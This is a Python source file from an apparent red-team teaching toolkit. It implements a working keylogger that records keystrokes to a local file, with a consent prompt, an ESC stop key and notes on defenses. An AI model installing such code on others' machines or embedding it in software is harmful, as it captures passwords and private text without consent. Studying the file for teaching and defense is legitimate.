# =============================================================================
# Feature: Keylogger (Red Team - Educational)
# What it is: Records keystrokes to a local file to demonstrate how keyloggers work.
# How it works: Hooks keyboard events via pynput and appends each key to a log file.
# How tool does it: pynput.keyboard.Listener captures key presses; ESC stops it.
# Defense: Endpoint protection (EDR), application whitelisting, MFA to limit damage.
# NOTE: Only run on your own machine.
# Requires: pip install pynput
# =============================================================================

from pynput import keyboard
from pathlib import Path

LOG_FILE = Path(__file__).parent.parent / "key_log.txt"


def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{key.name}]")


def on_release(key):
    if key == keyboard.Key.esc:
        return False


def run():
    print("\n[KEYLOGGER - EDUCATIONAL DEMO]")
    print(f"  Logging keystrokes to: {LOG_FILE}")
    print("  Press ESC to stop.\n")

    confirm = input("  Type 'yes' to start on THIS machine only: ").strip().lower()
    if confirm != "yes":
        print("  Aborted.")
        return

    print("  [*] Logging keystrokes ...")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    print(f"\n  [+] Keylog saved to {LOG_FILE}")
